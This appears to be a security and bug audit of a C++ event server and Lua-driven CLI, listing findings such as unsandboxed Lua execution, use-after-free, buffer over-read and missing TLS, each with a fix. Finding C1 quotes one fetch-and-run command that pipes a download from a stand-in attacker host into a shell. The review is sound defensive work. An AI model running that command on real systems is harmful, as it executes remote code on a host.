# Security & Bug Review — `app/src/` and `app/cli/src/`

Reviewed on 2026-04-24. File/line references are against the working copy at
`/Users/naushada/repo/grace-server/hackthon`.

Findings are grouped by severity. Each one lists the file, the exact line
range, a description, the impact, and a concrete remediation.

---

## Critical

### C1. Arbitrary code execution from dropped `.lua` files
- **Files:** `app/src/lua_engine.cpp:76`, `app/inc/lua_engine.hpp:19`,
  `app/src/fs_app.cpp:10-29`, `app/src/fs_app.cpp:45-91`
- **What:** The `lua_file` constructor calls `luaL_openlibs`, exposing `os`,
  `io`, `package`, `debug`, etc. `process_create_luafile` then runs
  `luaL_dofile` on every `.lua` file found in the watched directory.
- **Impact:** Anyone who can write a file into `/app/command` — a local user,
  a misconfigured volume mount, a backup-restore job, a future upload
  endpoint — obtains code execution as the `edge` user. `os.execute("curl
  attacker.com/x | sh")` works out of the box.
- **Fix:** Stop calling `luaL_openlibs`. Use `luaL_requiref` to load only the
  libraries you actually need (`base`, `table`, `string`, `math`). Add an
  instruction-budget hook via `lua_sethook(L, hook, LUA_MASKCOUNT, N)` and
  either tighten directory permissions on `/app/command` or cryptographically
  sign the `.lua` files before loading.

### C2. Use-after-free in `client_event_cb`
- **File:** `app/src/framework.cpp:22-31`
- **What:** Both error branches do
  `clnt->parent().handle_close(channel)`, which calls
  `server::handle_close` → `clients().erase(channel)`, destroying the
  `unique_ptr<connected_client>` and the object `clnt` points at. If
  libevent delivers both `BEV_EVENT_EOF` and `BEV_EVENT_ERROR` in the same
  callback (legal per the libevent API), the second branch dereferences
  `clnt` after it has been freed.
- **Impact:** UAF → potential crash or code execution depending on heap
  layout. CWE-416.
- **Fix:** Change the second `if` to `else if`, or `return` immediately after
  the first close. Capture `channel` into a local before the erase and copy
  any state you still need.

### C3. Buffer over-read in `fs_app::process_inotify_onchange`
- **File:** `app/src/fs_app.cpp:31-117` (condition on line 103)
- **What:** The loop is `do { … } while (offset <= in.length());`. On the
  final iteration `offset == in.length()`, the body reads
  `*(inotify_event*)(in.data() + offset)` — one struct past the end —
  and then accesses `event->len`.
- **Impact:** Undefined behavior, potential information disclosure, likely
  reason ASan/valgrind complain. CWE-125.
- **Fix:** `while (offset < in.length())`.

### C4. Dead `IN_CREATE` / `IN_MODIFY` branches
- **Files:** `app/inc/fs_app.hpp:27-29`, `app/src/fs_app.cpp:45,51`
- **What:** `inotify_add_watch` is armed with `IN_CLOSE_WRITE | IN_DELETE |
  IN_MOVED_TO | IN_MOVED_FROM`. The handler tests `event->mask & IN_CREATE`
  and `event->mask & IN_MODIFY` — neither event is ever delivered.
- **Impact:** The "hot reload" feature does not work for newly created
  `.lua` files. Operators lose the primary benefit of the file watcher.
- **Fix:** Either add `IN_CREATE | IN_MODIFY` to the watch mask, or (better)
  change the handler branches to test `IN_CLOSE_WRITE` for both "new" and
  "modified" cases — `IN_CLOSE_WRITE` fires when an editor saves the file.

---

## High

### H1. Missing `return` statements (undefined behavior)
- **Files:** `app/src/server_app.cpp:8-18`,
  `app/src/fs_app.cpp:10-29`
- **What:** Both functions return `std::int32_t` but fall off the end on the
  success path.
- **Impact:** Caller reads whatever happened to be in the return register.
  Compilers warn with `-Wreturn-type` but the project's CXX flags don't
  elevate to `-Werror`.
- **Fix:** Add `return 0;` at the bottom of each function.

### H2. Uninitialized `sockaddr_in` used for listener bind
- **File:** `app/inc/framework.hpp:94-111`
- **What:** `getaddrinfo` is called; on failure (`s != 0`) the `if (!s)`
  block is skipped, leaving `self_addr` uninitialized. That garbage is then
  passed to `evconnlistener_new_bind`.
- **Impact:** Undefined memory treated as an address — bind may succeed on
  an unexpected interface/port or crash. CWE-457.
- **Fix:** Zero-initialize `self_addr{}` at declaration, and on
  `getaddrinfo` failure throw / log / return instead of binding.

### H3. `parse_lua_to_table` called with stack index 0
- **Files:** `app/src/lua_engine.cpp:75-87`
- **What:** After `luaL_dofile`, `lua_gettop(L)` returns 0 if the script
  only assigns globals (as `StartDownlinkConnectionsTestRequest.lua` does).
  That 0 is passed to `parse_lua_to_table`, which calls `lua_next(L, 0)`.
  Index 0 is not a valid Lua stack position and raises a Lua error.
- **Impact:** Parsing silently fails or aborts depending on Lua config.
  Command map is empty → no CLI completion, no protobuf mapping.
- **Fix:** After `luaL_dofile`, explicitly push the global table you care
  about, e.g. `lua_getglobal(L, derived_name_from_file)`, then parse from
  the new top-of-stack.

### H4. File-descriptor leak on `getnameinfo` failure
- **File:** `app/src/framework.cpp:62-71`
- **What:** If `getnameinfo` returns non-zero, `server_accept_cb` returns
  without ever handing `fd` to a `connected_client`. The bufferevent is
  never created, so `BEV_OPT_CLOSE_ON_FREE` never fires.
- **Impact:** Descriptor leak under malformed peer addresses — an attacker
  spraying half-open IPv6 with odd scope IDs could exhaust fds. CWE-404.
- **Fix:** `evutil_closesocket(fd);` on the error path.

### H5. Null-pointer deref on `bufferevent_socket_new` failure
- **File:** `app/inc/framework.hpp:66-92`
- **What:** Both fd-taking constructors of `evt_io` ignore the return value
  of `bufferevent_socket_new`. If it returns `nullptr`, the immediately
  following `bufferevent_setcb` and `bufferevent_enable` calls deref it.
- **Impact:** Crash on resource exhaustion. CWE-476.
- **Fix:** Check for `nullptr` and throw `std::runtime_error` or close the
  fd and return.

---

## Medium

### M1. Log / terminal-escape injection
- **File:** `app/src/client_app.cpp:13`
- **What:** Network-controlled bytes are streamed to stdout:
  `std::cout << "Fn:" << … << "Received:" << data`.
- **Impact:** An attacker can embed ANSI escapes, carriage returns, and
  newlines into server logs. If the operator tails logs in a terminal,
  the attacker can spoof log lines, clear the screen, or trigger certain
  terminal features (CWE-117/150).
- **Fix:** Hex-dump or escape non-printable bytes before logging. Consider a
  structured logger that quotes raw fields.

### M2. Uncaught numeric-conversion exceptions in the CLI
- **File:** `app/cli/src/readline.cpp:397-420`
- **What:** `std::stoi`, `std::stoul`, `std::stod` throw on bad input.
  There is no try/catch.
- **Impact:** A single malformed `foo=abc` input terminates the CLI.
- **Fix:** Wrap each conversion in try/catch and print a user-friendly
  error.

### M3. Manual `new`/`delete` on protobuf message
- **File:** `app/cli/src/readline.cpp:362-395`
- **What:** `create_message_by_name` returns a raw `Message*` created via
  `prototype->New()`. `apply_to_proto` deletes it at the end, but if any
  intermediate call throws, `msg` leaks.
- **Fix:** Hold it in `std::unique_ptr<google::protobuf::Message>`.

### M4. `server::handle_connect` silently drops new connections on fd reuse
- **File:** `app/src/server_app.cpp:8-18`
- **What:** If `clients().insert(...)` fails because a stale entry exists
  for the same fd (kernel reused the fd after a client closed without
  `handle_close` firing), the new `connected_client` is destroyed, closing
  the new fd, while the stale entry stays in the map forever.
- **Fix:** Call `clients().erase(channel)` before `insert`, or use
  `insert_or_assign` so the new `connected_client` takes over.

### M5. No authentication / no TLS
- **File:** `app/src/main_app.cpp:12`
- **What:** `server svc_module("0.0.0.0", 58989)` — public, plaintext TCP.
- **Impact:** Any client on the network can drive `handle_read` /
  `handle_write`. Depending on what protobuf messages will eventually be
  dispatched, this can be catastrophic.
- **Fix:** Document the intended threat model. If the server should be
  exposed, wrap it in `bufferevent_openssl` and add mutual TLS or at least a
  shared-secret challenge.

### M6. `command.bin` written to CWD with no error handling
- **File:** `app/cli/src/readline.cpp:432-435`
- **What:** Relative path, no check on `output.good()`. Multiple CLI
  instances silently clobber each other.
- **Fix:** Use an explicit path (`/app/run/command.bin`), create the parent
  directory, and check the stream state.

---

## Low / latent

### L1. `is_lua_array` has a wrong stack index
- **File:** `app/src/lua_engine.cpp:6-16`
- **What:** `lua_next(L, index - 1)` — if `index == -1`, the call targets
  stack slot `-2`. The function is currently unused (parse_lua_to_table
  uses its own `lua_rawgeti(L, -1, 1)` array detection), but if someone
  wires it up later it will misbehave.
- **Fix:** Remove the function or replace the body with the correct
  rawgeti-based check.

### L2. `m_old_event` survives across unrelated inotify deliveries
- **File:** `app/src/fs_app.cpp:58-86, 106-115`
- **What:** A `IN_MOVED_FROM` without a paired `IN_MOVED_TO` on the same
  flush sticks around until the next `process_inotify_onchange` concludes.
  Benign here, but worth adding a timestamp / generation number so old
  buffers can't be mismatched with later MOVED_TO events.

### L3. Static initialization order
- **File:** `app/cli/src/readline.cpp:12`
- **What:** `static fs_app fs_mon("/app/command");` runs before `main`,
  doing `inotify_init`, `inotify_add_watch`, and directory iteration.
  If the directory is missing the watch silently fails; the rest of the
  CLI still runs but with an empty command map.
- **Fix:** Move the `fs_app` instance into `run_cli` / `init_readline` so
  failures are visible to the user at startup.

### L4. `dump_table` prints doubles raw
- **File:** `app/src/lua_engine.cpp:96-146`
- **Impact:** NaN / infinity in a Lua file will render as `nan` / `inf`
  in logs. Not a vuln, just cosmetic.

---

## Suggested next steps

1. Add `-Wreturn-type -Werror` (and ideally `-Wall -Wextra -Wpedantic
   -Werror`) to the top-level `CMakeLists.txt` so H1 can't happen again.
2. Turn on ASan / UBSan in a CI build (`-DCMAKE_BUILD_TYPE=Asan` with
   matching `add_compile_options(-fsanitize=address,undefined)`). This
   surfaces C2, C3, H2, H5 at test time.
3. Harden `lua_engine.cpp` (C1 + H3) before shipping `/app/command` to any
   system you don't fully control.
4. Add regression gtests for each fix so they stay fixed — the test
   scaffolding added under `app/test/` and `app/cli/test/` already covers
   several of these areas and can be extended.
